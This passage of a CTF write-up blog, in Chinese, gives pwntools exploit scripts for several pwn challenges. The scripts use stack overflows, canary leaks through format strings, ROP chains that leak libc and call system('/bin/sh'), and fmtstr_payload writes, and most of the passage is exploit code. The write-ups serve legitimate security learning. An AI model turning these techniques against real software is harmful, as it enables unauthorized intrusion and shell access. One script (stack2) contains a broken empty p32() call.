class="string">&quot;111.200.241.244&quot;</span>, <span class="number">53975</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>* <span class="number">55</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">number = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;name: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6): &quot;</span>, <span class="built_in">str</span>(number[i]).encode())</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">flag = io.recv()</span><br><span class="line">log.info(<span class="string">&quot;flag: %s&quot;</span> % flag)</span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220330220400353.png" class="" title="image-20220330220400353"><h2 id="2-forgot"><a href="#2-forgot" class="headerlink" title="2. forgot"></a>2. forgot</h2><p>backdoorctf-2015</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331102030323.png" class="" title="image-20220331102030323"><p>IDA打开分析，程序存在后门，地址是0x80486CC的位置，只需要让程序最终执行这个函数就OK了</p><p>exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&quot;d033ab68b3e64913a1b6b1029ef3dc29&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">56237</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;123&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">32</span></span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line">payload += p32(<span class="number">0x80486CC</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">32</span> - <span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, payload)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331101937404.png" class="" title="image-20220331101937404"><h2 id="3-Mary-Morton"><a href="#3-Mary-Morton" class="headerlink" title="3. Mary_Morton"></a>3. Mary_Morton</h2><p>ASIS-CTF-Finals-2017</p><p>IDA打开程序分析，发现即存在栈溢出漏洞，也存在格式化字符串漏洞，所以用格式化字符串漏洞泄露canary，然后再利用缓冲区溢出调用后门获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./22e2d7579d2d4359a5a1735edddef631&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">62874</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;battle \n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&quot;%23$p&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;battle \n&quot;</span>)[:<span class="number">18</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leak_canary: 0x%x&quot;</span> % canary)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x04008DA</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ret_addr = <span class="number">0x4008EA</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span> + p64(canary) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span> + p64(ret_addr) + p64(backdoor)<span class="comment"># 加ret是为了对齐</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">flag = io.recv()</span><br><span class="line">log.info(<span class="string">&quot;flag: &#123;&#125;&quot;</span>. <span class="built_in">format</span>(flag))</span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331112106323.png" class="" title="image-20220331112106323"><h2 id="4-stack2"><a href="#4-stack2" class="headerlink" title="4. stack2"></a>4. stack2</h2><p>XCTF 4th-QCTF-2018</p><p>IDA打开程序分析，这个地方存在泄露，可以将返回地址覆盖掉</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331161030763.png" class="" title="image-20220331161030763"><p>本来是把返回地址覆盖为hackhere函数，但是pwn的时候，系统显示找不到bash。。。然后又利用puts函数打印出puts的地址和__libc_start_main的地址去libc-database搜，但是搜不到对应的libc，又想在栈上构造/bin/sh，但是无法泄露出栈的地址，，，无奈之下，看了别人的WP，原来执行system(sh)也可以，不用加路径。。。。EXP为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;3fb1a42837be485aae7d85d11fbc457b&#x27;)\</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">50279</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">backdoor = <span class="number">0x804859B</span></span><br><span class="line">backdoor_addr_bytes = p32(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;you have:\n&quot;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auto_send</span>(<span class="params">data, _offset=<span class="number">132</span></span>):</span>       <span class="comment"># 132 is return address</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        io.sendlineafter(<span class="string">&#x27;exit\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">&#x27;number to change:\n&#x27;</span>, <span class="built_in">str</span>(_offset+i).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">&#x27;new number:\n&#x27;</span>, <span class="built_in">str</span>(data[i]).encode())</span><br><span class="line">    </span><br><span class="line">sh_addr = <span class="number">0x8048987</span></span><br><span class="line">system_addr = <span class="number">0x8048450</span></span><br><span class="line"></span><br><span class="line">payload = p32()+ <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span> + p32(sh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_send(payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;exit\n&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331160955395.png" class="" title="image-20220331160955395"><h2 id="5-pwn-100"><a href="#5-pwn-100" class="headerlink" title="5. pwn-100"></a>5. pwn-100</h2><p>L-CTF-2016</p><p>泄露地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;bee9f73f50d2487e911da791273ae5a3&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">61302</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;bee9f73f50d2487e911da791273ae5a3&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x00400763</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> + p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;setbuf&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">res = io.recvline(<span class="number">6</span>)</span><br><span class="line">log.info(<span class="string">&quot;puts: %s&quot;</span> % hexlify(res[::-<span class="number">1</span>][<span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">res = io.recvline(<span class="number">6</span>)</span><br><span class="line">log.info(<span class="string">&quot;setbuf: %s&quot;</span> % hexlify(res[::-<span class="number">1</span>][<span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">res = io.recvline(<span class="number">6</span>)</span><br><span class="line">log.info(<span class="string">&quot;read: %s&quot;</span> % hexlify(res[::-<span class="number">1</span>][<span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">res = io.recvline(<span class="number">6</span>)</span><br><span class="line">log.info(<span class="string">&quot;__libc_start_main: %s&quot;</span> % hexlify(res[::-<span class="number">1</span>][<span class="number">1</span>:]))</span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331172148750.png" class="" title="image-20220331172148750"><p>然后去libc-database查询libc</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331172231859.png" class="" title="image-20220331172231859"><p>exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;bee9f73f50d2487e911da791273ae5a3&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">61302</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;bee9f73f50d2487e911da791273ae5a3&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x00400763</span></span><br><span class="line">puts_offset = <span class="number">0x6f690</span></span><br><span class="line">str_bin_sh_offset = <span class="number">0x18cd57</span></span><br><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">read200func_addr = <span class="number">0x040068E</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> + p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(read200func_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">puts_addr = u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts : %s&quot;</span> % <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> + p64(pop_rdi_addr) + p64(libc_base + str_bin_sh_offset) + p64(libc_base + system_offset)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331173016683.png" class="" title="image-20220331173016683"><h2 id="6-warmup"><a href="#6-warmup" class="headerlink" title="6. warmup"></a>6. warmup</h2><p>csaw-ctf-2016-quals</p><p>题目没有附件，先nc看看</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331192057579.png" class="" title="image-20220331192057579"><p>程序输出了一个地址，因为是0X400000 + 0X60D猜测这是get_shell或输出flag的地址，然后让咱们输入，输入格式化字符串的数据并没有什么效果，猜测是栈溢出，然后写脚本爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x40060d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * i + p64(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">51136</span>)</span><br><span class="line">            io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, payload)</span><br><span class="line">            <span class="comment"># sleep(0.1)</span></span><br><span class="line">            c = io.recv()</span><br><span class="line">            log.info(<span class="string">&quot;&#123;&#125;: Info: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            log.info(<span class="string">&quot;badsize: %d&quot;</span> % i)</span><br><span class="line">            io.close()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><h2 id="7-反应釜开关控制"><a href="#7-反应釜开关控制" class="headerlink" title="7. 反应釜开关控制"></a>7. 反应釜开关控制</h2><p>XCTF 4th-CyberEarth</p><p>下载附件，IDA查看就是普通的栈溢出，溢出3次，即可getshell，或者第一次溢出就改为get shell的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ad72d90fbd4746ac8ea80041a1f661c2&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">51643</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;witch is:&quot;</span>)</span><br><span class="line">easy_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>).decode(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;easy addr: 0x%x&quot;</span> % easy_addr)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">520</span> + p64(easy_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;witch is:&quot;</span>)</span><br><span class="line">normal_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>).decode(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;normal addr: 0x%x&quot;</span> % normal_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">392</span> + p64(normal_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;witch is:&quot;</span>)</span><br><span class="line">shell_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>).decode(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;shell addr: 0x%x&quot;</span> % shell_addr)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span>* <span class="number">264</span> + p64(shell_addr)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="8-实时数据监测"><a href="#8-实时数据监测" class="headerlink" title="8. 实时数据监测"></a>8. 实时数据监测</h2><p>IDA打开分析，格式化字符串漏洞，直接用fmtstr_payload 构造payload即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key_address = <span class="number">0x0804A048</span></span><br><span class="line">value = <span class="number">0x2223322</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;9926c1a194794984978011fc619e3301&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">62045</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>, &#123;key_address: value&#125;)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220331204056149.png" class="" title="image-20220331204056149"><h2 id="9-welpwn"><a href="#9-welpwn" class="headerlink" title="9.  welpwn"></a>9.  welpwn</h2><p>RCTF-2015</p><p>IDA打开程序分析</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220401164518252.png" class="" title="image-20220401164518252"><p>这个位置存在栈溢出漏洞，但是会被\0截断，在strcmp那里下断点，即让它复制完之后下断点，观察栈的数据，发现截断后的数据紧跟着原始数据</p><img src="/2022/04/01/pwn%E5%88%B7%E9%A2%981/image-20220401164744369.png" class="" title="image-20220401164744369"><p>这样就可以构造ROP链泄露出puts的地址，进而搜到libc的地址，然后再找到system的地址就OK了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;81f42c219e81421ebfd1bedd19cf7eff&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;81f42c219e81421ebfd1bedd19cf7eff&quot;)</span></span><br><span class="line"><span class="comment"># io =remote(&quot;111.200.241.244&quot; ,64634)</span></span><br><span class="line"><span class="comment"># io = remote(&#x27;127.0.0.1&#x27;, 10001)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">62546</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">c = io.recv()</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x04008a3</span></span><br><span class="line">pop_r13_r14_r15_addr = <span class="number">0x040089e</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span></span><br><span class="line">payload += p64(pop_r13_r14_r15_addr)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])             <span class="comment"># shellcode start</span></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0x0004007CD</span>)     <span class="comment"># func main</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;\x40&quot;</span>)</span><br><span class="line">puts_addr_byte = u64(io.recvline(<span class="number">6</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr: %s&quot;</span> % <span class="built_in">hex</span>(puts_addr_byte))</span><br><span class="line"></span><br><span class="line">write_addr_byte = u64(io.recvline(<span class="number">6</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;write_addr: %s&quot;</span> % <span class="built_in">hex</span>(write_addr_byte))</span><br><span class="line"></span><br><span class="line">read_addr_byte = u64(io.recvline(<span class="number">6</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;read_addr: %s&quot;</span> % <span class="built_in">hex</span>(read_addr_byte))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr_byte - <span class="number">0xf72b0</span></span><br><span class="line">ret_addr = <span class="number">0x00004007CC</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base: %s&quot;</span> % <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_address = libc_base + <span class="number">0x45390</span></span><br><span class="line">str_bin_sh_address = libc_base + <span class="number">0x18cd57</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span></span><br><span class="line">payload2 += p64(pop_r13_r14_r15_addr)</span><br><span class="line">payload2 += <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span></span><br><span class="line">payload2 += p64(ret_addr)</span><br><span class="line">payload2 += p64(pop_rdi_addr) + p64(str_bin_sh_address)</span><br><span class="line">payload2 += 